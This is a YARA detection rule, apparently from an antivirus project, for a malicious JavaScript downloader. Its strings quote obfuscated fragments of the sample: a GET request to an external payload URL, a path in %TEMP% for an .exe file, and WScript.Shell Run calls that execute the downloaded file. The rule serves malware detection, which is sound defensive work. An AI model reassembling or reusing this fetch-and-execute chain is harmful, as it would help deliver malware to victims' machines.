rule sig_20160329_d43cf36d88bd74e99a7ad17499df8696 {
  meta:
    description = "datamaliciousorder - file 20160329_d43cf36d88bd74e99a7ad17499df8696.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "94aacba362b63b204bcd7619faa0d6330e892cceffc5d3f5d267bd92473db5bf"

  strings:
    $s1  = "Podspy[Yojabtro](\"GET\", \"http://baskinandbraw.com/wo8pfd\", false);" fullword ascii
    $s2  = "function Qehgrfszfz() {return Ajvbnpyifa[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"AA4puB7el.exe\";};" fullword ascii
    $s3  = "do {WScript[Ohliobgo](Otcij() * 11)} while (Podspy[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Ajvbnpyifa = function Fjxxvvswt() {return WScript[Ufqho](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Zwgwjdsk(Pmhsmghu, Uaacqllmq){return Pmhsmghu - Uaacqllmq;};" fullword ascii
    $s6  = "function Sefhhtmyj(Lwwbw){Ajvbnpyifa[\"Run\"](Lwwbw, Biiclm, Biiclm);};" fullword ascii
    $s7  = "function Rgqwdcusw() {return ((Jjefaismuz == true) && (Jjefaismuz == Oxbpqj)) ? 1 : Biiclm;};" fullword ascii
    $s8  = "function Hvunyinn()" fullword ascii
    $s9  = "return Zwgwjdsk(Hxjfsms, Zzpxd);" fullword ascii
    $s10 = "Jjefaismuz = true; " fullword ascii
    $s11 = "function Otcij(){return 22;};" fullword ascii
    $s12 = "var Jjefaismuz = false;" fullword ascii
    $s13 = "var Hrdbuzws = false;" fullword ascii
    $s14 = " while (Xlheha){" fullword ascii
    $s15 = "function Dekxqo(){return Ufqho;};" fullword ascii
    $s16 = "function Hvakcy(){return Ndcpwifmr;};" fullword ascii
    $s17 = "Oxbpqj = true; " fullword ascii
    $s18 = "function Bmvort(Dseazkif) {var Zmbpm = (1, 2, 3, 4, 5, Dseazkif); return Zmbpm;};" fullword ascii
    $s19 = "var Oxbpqj = false;" fullword ascii
    $s20 = "var Rralycit = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}